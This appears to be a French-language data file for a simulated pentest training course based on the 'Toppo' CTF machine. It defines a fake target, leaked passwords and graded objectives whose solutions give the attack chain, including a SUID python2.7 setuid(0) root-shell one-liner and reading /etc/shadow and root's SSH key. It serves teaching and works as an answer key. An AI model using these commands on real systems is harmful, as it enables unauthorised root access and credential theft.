// sim-data-toppo.js — données du cours "Toppo" pour sim-engine.js (v2, exploration libre)
// Toute la vérité du labo vit ici : arborescence des deux machines, ports,
// pages web, identifiants, binaire SUID, flag. Le moteur (sim-engine.js) ne
// connaît rien de "Toppo" en dur — il ne fait que naviguer cette donnée.
(function (global) {
  "use strict";
  const P = global.PentestSim;
  const dir = P.dirNode, file = P.fileNode;

  // ------------------------------- machine Toppo (cible) ------------------------------
  const toppoVfs = dir({
    var: dir({
      www: dir({
        html: dir({
          "index.html": file(
            "<!doctype html>\n<html>\n<head><title>Clean Blog - demo</title></head>\n<body>\n<!-- site vitrine générique, rien d'intéressant côté source -->\n<h1>Welcome</h1>\n</body>\n</html>",
            { owner: "www-data", perms: "rwr-", mtime: "Apr 15  2018" }
          ),
          admin: dir({
            "notes.txt": file(
              "Note to myself :\nI need to change my password :/\n12345ted123 is too outdated but the technology isn't my thing\ni prefer go fishing or watching soccer .",
              { owner: "www-data", perms: "rwr-", mtime: "Apr 15  2018" }
            )
          }, { owner: "www-data", perms: "rwr-", mtime: "Apr 15  2018" }),
          mail: dir({
            "thoughts.txt": file(
              "todo: penser a changer le mdp du ftp aussi un jour\net arreter de reutiliser 12345ted123 partout...",
              { owner: "www-data", perms: "rwr-", mtime: "Apr 15  2018" }
            )
          }, { owner: "www-data", perms: "rwr-", mtime: "Apr 15  2018" }),
          LICENSE: file(
            "Ce thème est fourni à titre pédagogique dans le cadre du Pentest Lab.\nAucune licence commerciale associée.",
            { owner: "www-data", perms: "rwr-", mtime: "Apr 15  2018" }
          )
        }, { owner: "www-data", perms: "rwr-", mtime: "Apr 15  2018" })
      }, { owner: "root", perms: "rwr-" }),
      // Deux dossiers systeme classiques, invisibles tant qu'on n'est pas root
      // (perms "rw--" = seul le owner "root" peut entrer) — de quoi fouiner
      // un peu une fois l'accès total obtenu, sans que ça serve à un nouvel
      // objectif coeur : c'est de l'exploration pure, pour le plaisir de
      // comprendre une vraie machine Linux.
      backups: dir({
        "passwd.bak": file(
          "root:x:0:0:root:/root:/bin/bash\nted:x:1000:1000:ted,,,:/home/ted:/bin/bash\ncindy:x:1001:1001:cindy,,,:/home/cindy:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin",
          { owner: "root", perms: "rw--", mtime: "Jan  3  2018" }
        )
      }, { owner: "root", perms: "rw--", mtime: "Jan  3  2018" }),
      mail: dir({
        root: file(
          "From cron@Toppo  Sun Apr 15 09:02:11 2018\nSubject: Rappel hebdomadaire\n\nPenser a verifier la rotation des logs dans /var/log avant la fin du mois.\n-- cron",
          { owner: "root", perms: "rw--", mtime: "Apr 15  2018" }
        )
      }, { owner: "root", perms: "rw--", mtime: "Apr 15  2018" })
    }),
    home: dir({
      ted: dir({
        "notes-perso.txt": file(
          "Idees week-end :\n- peche au bord du canal\n- revoir le match de dimanche\n- changer TOUS mes mots de passe (pour de vrai cette fois)",
          { owner: "ted", perms: "rwr-", mtime: "Apr 14  2018" }
        ),
        ".bash_history": file(
          "whoami\nid\npwd\nls -la\nuname -a\nexit",
          { owner: "ted", perms: "rwr-", mtime: "Apr 15  2018" }
        )
      }, { owner: "ted", perms: "rwr-", mtime: "Apr 15  2018" })
    }),
    root: dir({
      "flag.txt": file(
        "_________                                  \n" +
        "|  _   _  |                                 \n" +
        "|_/ | | \\_|.--.   _ .--.   _ .--.    .--.   \n" +
        "    | |  / .'`\\ \\[ '/'`\\ \\[ '/'`\\ \\/ .'`\\ \\ \n" +
        "   _| |_ | \\__. | | \\__/ | | \\__/ || \\__. | \n" +
        "  |_____| '.__.'  | ;.__/  | ;.__/  '.__.'  \n" +
        "                 [__|     [__|              \n\n" +
        "Congratulations ! there is your flag : 0wnedlab{p4ssi0n_c0me_with_pract1ce}",
        { owner: "root", perms: "rw--", mtime: "Apr 15  2018", isFlag: true }
      ),
      ".bash_history": file("id\nwhoami\nls -la /root\ncat flag.txt", { owner: "root", perms: "rw--", mtime: "Apr 15  2018" }),
      Documents: dir({
        "infra-notes.txt": file(
          "Parc :\n- Toppo (ce serveur) : blog vitrine, a migrer un jour vers du HTTPS\n- backup-srv (192.168.56.50) : sauvegardes hebdo, cle SSH dediee dans .ssh/\nA faire : desactiver l'acces SSH par mot de passe, ne garder que les cles.",
          { owner: "root", perms: "rw--", mtime: "Mar  2  2018" }
        ),
        "todo-admin.txt": file(
          "- changer le mdp de ted (il reutilise 12345ted123 PARTOUT, meme sur le ftp)\n- retirer python2.7 du SUID, ca sert a rien qu'il le soit\n- mettre a jour Apache",
          { owner: "root", perms: "rw--", mtime: "Feb 20  2018" }
        )
      }, { owner: "root", perms: "rw--", mtime: "Mar  2  2018" }),
      Pictures: dir({
        "vacances_2017.jpg": file("[JPEG binary data]", {
          owner: "root", perms: "rw--", mtime: "Aug 20  2017",
          binary: true, filetype: "JPEG image data, JFIF standard 1.01, 1920x1080", size: 284213
        }),
        "capture_admin.png": file("[PNG binary data]", {
          owner: "root", perms: "rw--", mtime: "Jan  9  2018",
          binary: true, filetype: "PNG image data, 1024 x 768, 8-bit/color RGBA", size: 96420
        })
      }, { owner: "root", perms: "rw--", mtime: "Aug 20  2017" }),
      ".ssh": dir({
        "authorized_keys": file(
          "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7fJ4z... backup-srv-deploy",
          { owner: "root", perms: "rw--", mtime: "Feb 11  2018" }
        ),
        "id_rsa": file(
          "-----BEGIN RSA PRIVATE KEY-----\n[cle factice generee pour l'exercice — inutilisable telle quelle]\nMIIEowIBAAKCAQEA0Z3VS5JJcds3xfn/ygWyF0/dOkV5A0oWJj0G3/e...\n-----END RSA PRIVATE KEY-----",
          { owner: "root", perms: "rw--", mtime: "Feb 11  2018", finding: { label: "clé privée", value: "/root/.ssh/id_rsa" } }
        )
      }, { owner: "root", perms: "rw--", mtime: "Feb 11  2018" })
    }, { owner: "root", perms: "rw--", mtime: "Apr 15  2018" }),
    usr: dir({
      bin: dir({
        "python2.7": file("[binaire ELF]", { owner: "root", perms: "rwrw", suid: true, mtime: "Aug 13  2016", filetype: "ELF 32-bit LSB executable" }),
        chsh: file("[binaire ELF]", { owner: "root", perms: "r-r-", mtime: "Jun  2015" }),
        passwd: file("[binaire ELF]", { owner: "root", perms: "r-r-", mtime: "May 17  2017" })
      })
    }),
    etc: dir({
      "issue": file("Debian GNU/Linux 8 \\n \\l", { owner: "root", perms: "rwr-" }),
      "passwd": file(
        "root:x:0:0:root:/root:/bin/bash\nted:x:1000:1000:ted,,,:/home/ted:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin",
        { owner: "root", perms: "rwr-" }
      ),
      "shadow": file(
        "root:$6$roundsF5k$aZ8pQ1e3W0j7RxT4uKvY9mLnH2sVbNcDeGfQwErTyUi0oPaSdFgHjKl1234567:17636:0:99999:7:::\n" +
        "ted:$6$roundsA2n$Bc9dEfGh1IjKl2MnOpQrSt3UvWxYz4A5b6C7d8E9f0GhIjKlMnOpQrStUvWxYz:17640:0:99999:7:::\n" +
        "www-data:*:17600:0:99999:7:::",
        { owner: "root", perms: "rw--", mtime: "Apr 15  2018", finding: { label: "hash root", value: "$6$roundsF5k$aZ8pQ1e3W0j7RxT4uKvY9mLnH2sVbNcDeGfQwErTyUi0oPaSdFgHjKl1234567" } }
      )
    }),
    sbin: dir({ "mount.nfs": file("[binaire ELF]", { owner: "root", perms: "r-r-", suid: true }) })
  });

  // ------------------------------- machine Kali (attaquant) ---------------------------
  const kaliVfs = dir({
    root: dir({}, { owner: "root", perms: "rwrw", mtime: "aujourd'hui" })
  });

  const toppoHost = {
    id: "toppo",
    hostname: "Toppo",
    ip: "192.168.56.102",
    fingerprint: "vJgmhqKOmHq0Mb0plSTyOdzw6GenPEkZkch+PIVozzw",
    osInfo: "OS: Linux; CPE: cpe:/o:linux:linux_kernel",
    uname: "Linux Toppo 3.16.0-4-586 #1 Debian 3.16.51-3 (2017-12-13) i686 GNU/Linux",
    noSudo: true,
    ports: [
      // finding:true = seul ce port apparaît en pastille en tête de terminal :
      // c'est le port réellement exploité (accès SSH final). 80 et 111 restent
      // visibles dans la sortie de nmap mais n'encombrent pas la barre du haut.
      { port: 22, service: "ssh", version: "OpenSSH 6.7p1 Debian 5+deb8u4", finding: true },
      { port: 80, service: "http", version: "Apache httpd 2.4.10 ((Debian))" },
      { port: 111, service: "rpcbind", version: "2-4 (RPC #100000)" }
    ],
    vfs: toppoVfs,
    web: {
      routes: {
        "/": { status: 200, content: "<html><body><h1>Clean Blog - Start Bootstrap Theme</h1></body></html>" },
        "/img/": { status: 301, brute: true, redirect: "/img/" },
        "/mail/": { status: 301, brute: true, redirect: "/mail/", content: "Index of /mail\n\n[DIR]  ../\n[TXT]  thoughts.txt", notable: true },
        "/admin/": { status: 301, brute: true, redirect: "/admin/", content: "Index of /admin\n\n[DIR]  ../\n[TXT]  notes.txt", notable: true },
        "/css/": { status: 301, brute: true, redirect: "/css/" },
        "/manual/": { status: 301, brute: true, redirect: "/manual/" },
        "/js/": { status: 301, brute: true, redirect: "/js/" },
        "/vendor/": { status: 301, brute: true, redirect: "/vendor/" },
        "/LICENSE": { status: 200, brute: true, content: "Ce thème est fourni à titre pédagogique dans le cadre du Pentest Lab.\nAucune licence commerciale associée." },
        "/server-status": { status: 403, brute: true },
        "/admin/notes.txt": {
          status: 200,
          content: "Note to myself :\nI need to change my password :/\n12345ted123 is too outdated but the technology isn't my thing\ni prefer go fishing or watching soccer .",
          // Dès que ce fichier est lu (curl/wget), le mot de passe devient une
          // pastille copiable en un clic — utile juste après pour le coller
          // directement dans le prompt de mot de passe SSH.
          finding: { label: "mdp", value: "12345ted123" }
        },
        "/mail/thoughts.txt": { status: 200, content: "todo: penser a changer le mdp du ftp aussi un jour\net arreter de reutiliser 12345ted123 partout..." }
      }
    },
    users: {
      ted: { home: "/home/ted", password: "12345ted123", idLine: "uid=1000(ted) gid=1000(ted) groups=1000(ted),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth)" }
    },
    motd: [
      "Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY.",
      "Last login: Sun Apr 15 12:33:00 2018 from 192.168.0.29"
    ],
    // Le déclenchement de l'élévation de privilège est une VRAIE expression
    // régulière tolérante (guillemets simples/doubles, espaces variables) —
    // pas une égalité de chaîne exacte comme dans l'ancien moteur : le joueur
    // doit comprendre *pourquoi* ça marche, pas mémoriser une syntaxe pixel-perfect.
    privesc: {
      match: function (raw) {
        return /python2\.7\s+-c\s+.*setuid\(\s*0\s*\).*os\.system\(\s*["']\/bin\/(ba)?sh["']\s*\)/i.test(raw);
      },
      to: "root",
      output: [
        { t: "whoami", c: "dim" },
        { t: "root", c: "ok" },
        { t: "id", c: "dim" },
        { t: "uid=0(root) gid=1000(ted) groups=1000(ted),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth)", c: "ok" }
      ]
    }
  };

  const kaliHost = {
    id: "kali",
    hostname: "kali",
    ip: "192.168.56.101",
    vfs: kaliVfs,
    users: { root: { home: "/root", password: null } }
  };

  // ------------------------------------ objectifs -------------------------------------
  // Somme des objectifs coeur = 100 -> conversion directe en /20.
  // Chaque check() lit uniquement des évènements observés par le moteur —
  // jamais une commande précise : plusieurs chemins peuvent satisfaire un
  // même objectif (curl, wget, ou navigateur simulé produisent le même
  // évènement de lecture web).
  const OBJECTIVES = [
    {
      id: "recon", points: 10, category: "Reconnaissance",
      title: "Scanner la cible pour identifier les services exposés",
      hint: "Un scan de ports avec détection de version cible directement l'IP de Toppo.",
      solution: "nmap -sV -sC 192.168.56.102",
      check: (s) => s.events.has("nmap:192.168.56.102")
    },
    {
      id: "webenum", points: 10, category: "Reconnaissance",
      title: "Découvrir les répertoires cachés du site web",
      hint: "Un outil de brute-force de répertoires web, pointé sur l'URL de Toppo.",
      solution: "gobuster dir -u http://192.168.56.102 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
      check: (s) => s.events.has("gobuster:192.168.56.102")
    },
    {
      id: "loot", points: 15, category: "Fuite d'information",
      title: "Récupérer les identifiants exposés sur le site",
      hint: "Un des répertoires trouvés par le brute-force contient un fichier texte lisible directement.",
      solution: "curl http://192.168.56.102/admin/notes.txt",
      check: (s) => s.events.has("read:toppo:web:/admin/notes.txt")
    },
    {
      id: "access", points: 20, category: "Accès initial",
      title: "Ouvrir une session SSH sur la cible",
      hint: "Le fichier de notes donne un mot de passe. Il reste à deviner à qui il appartient (indice : il aime la pêche).",
      solution: "ssh ted@192.168.56.102",
      solutionNote: "mot de passe : 12345ted123",
      check: (s) => s.events.has("ssh:toppo:ted")
    },
    {
      id: "privesc-enum", points: 15, category: "Élévation de privilèges",
      title: "Repérer un binaire SUID anormal",
      hint: "Cherche, sur tout le système de fichiers, les fichiers dont le bit SUID est positionné.",
      solution: "find / -perm -4000 -type f 2>/dev/null",
      check: (s) => s.events.has("find-suid:toppo")
    },
    {
      id: "root", points: 20, category: "Élévation de privilèges",
      title: "Obtenir un shell root",
      hint: "python2.7 est SUID root : un interpréteur SUID peut forcer son propre UID effectif avec le module os.",
      solution: "python2.7 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
      check: (s) => s.events.has("privesc:toppo:root")
    },
    {
      id: "flag", points: 10, category: "Validation",
      title: "Valider le flag final",
      hint: "Le flag se trouve dans le dossier personnel de root, désormais accessible.",
      solution: "cat /root/flag.txt",
      check: (s) => s.flagValidated
    }
  ];

  const BONUS = [
    {
      id: "bonus-hist", points: 2, category: "Bonus",
      title: "Lire l'historique bash de ted",
      hint: "Un fichier caché conserve les dernières commandes tapées par un utilisateur.",
      solution: "cat ~/.bash_history",
      check: (s) => s.events.has("read:toppo:/home/ted/.bash_history")
    },
    {
      id: "bonus-mail", points: 2, category: "Bonus",
      title: "Explorer le répertoire /mail/ découvert par le brute-force",
      hint: "Un des répertoires trouvés par gobuster n'a pas encore été visité.",
      solution: "curl http://192.168.56.102/mail/thoughts.txt",
      check: (s) => s.events.has("read:toppo:web:/mail/thoughts.txt")
    },
    {
      id: "bonus-denied", points: 1, category: "Bonus",
      title: "Se heurter à un Permission denied avant l'élévation",
      hint: "Essaie de lire le flag avant d'être root : le système va te le refuser, et c'est normal.",
      solution: "cat /root/flag.txt",
      solutionNote: "à tenter avant l'élévation de privilèges",
      check: (s, eng) => eng.hasEventPrefix("denied:toppo:/root")
    },
    // ---- Espionnage post-root : maintenant que tu es root, plus aucune
    // permission ne t'arrête — ces objectifs guident l'exploration pour
    // ceux qui ne savent pas par où fouiller une machine compromise.
    // Chacun fait grandir la fiche cible en tête de terminal (nouvelle
    // pastille copiable dès que l'info est lue).
    {
      id: "bonus-shadow", points: 2, category: "Espionnage post-root",
      title: "Lire /etc/shadow maintenant que tu es root",
      hint: "Ce fichier contient les hachages de mots de passe de tous les comptes — illisible sans les droits root.",
      solution: "cat /etc/shadow",
      check: (s) => s.events.has("read:toppo:/etc/shadow")
    },
    {
      id: "bonus-sshkeys", points: 2, category: "Espionnage post-root",
      title: "Inspecter les clés SSH de root",
      hint: "Un dossier caché .ssh dans /root contient les clés utilisées pour se connecter ailleurs.",
      solution: "cat /root/.ssh/id_rsa",
      check: (s) => s.events.has("read:toppo:/root/.ssh/id_rsa")
    },
    {
      id: "bonus-docs", points: 1, category: "Espionnage post-root",
      title: "Fouiller les documents personnels de root",
      hint: "Un dossier Documents traîne dans le home de root — vas-y jeter un œil.",
      solution: "cat /root/Documents/infra-notes.txt",
      check: (s, eng) => eng.hasEventPrefix("read:toppo:/root/Documents")
    },
    {
      id: "bonus-pictures", points: 1, category: "Espionnage post-root",
      title: "Regarder ce qui traîne dans Pictures",
      hint: "Les fichiers ne sont pas tous du texte : 'file' te dit ce que c'est vraiment sans avoir besoin de l'ouvrir.",
      solution: "file /root/Pictures/vacances_2017.jpg",
      check: (s, eng) => eng.hasEventPrefix("ls:toppo:/root/Pictures") || eng.hasEventPrefix("read:toppo:/root/Pictures")
    },
    {
      id: "bonus-backups", points: 1, category: "Espionnage post-root",
      title: "Trouver une ancienne sauvegarde du fichier passwd",
      hint: "Un dossier /var/backups garde parfois des copies oubliées de fichiers systeme.",
      solution: "cat /var/backups/passwd.bak",
      check: (s) => s.events.has("read:toppo:/var/backups/passwd.bak")
    }
  ];

  global.PENTESTLAB_COURSES = global.PENTESTLAB_COURSES || {};
  global.PENTESTLAB_COURSES.toppo = {
    id: "toppo-v2",
    title: "Toppo",
    attacker: { id: "kali", user: "root", home: "/root" },
    hosts: [kaliHost, toppoHost],
    objectives: OBJECTIVES,
    bonusObjectives: BONUS,
    flag: {
      salt: "toppo\u00b7lab\u00b7v2\u00b7",
      hash: "a5a8ee7cd835de0079dcfd35aee2cb2aedf295a22595cd5f51b70a54e50ac636" // sha256(salt + "0wnedlab{p4ssi0n_c0me_with_pract1ce}")
    },
    freeIntroHtml:
      "Terminal ouvert sur <strong class=\"hl-gold\">kali@kali</strong>, root de plein droit sur ta propre machine. " +
      "La cible <strong class=\"hl-gold\">192.168.56.102</strong> (Toppo) n'a encore été ni scannée, ni fouillée : à toi de jouer, " +
      "sans étapes imposées — <strong class=\"hl-gold\">nmap</strong>, <strong class=\"hl-gold\">ls</strong>, <strong class=\"hl-gold\">cd</strong>, " +
      "<strong class=\"hl-gold\">cat</strong>, <strong class=\"hl-gold\">find</strong> et <strong class=\"hl-gold\">grep</strong> fonctionnent vraiment."
  };
})(window);
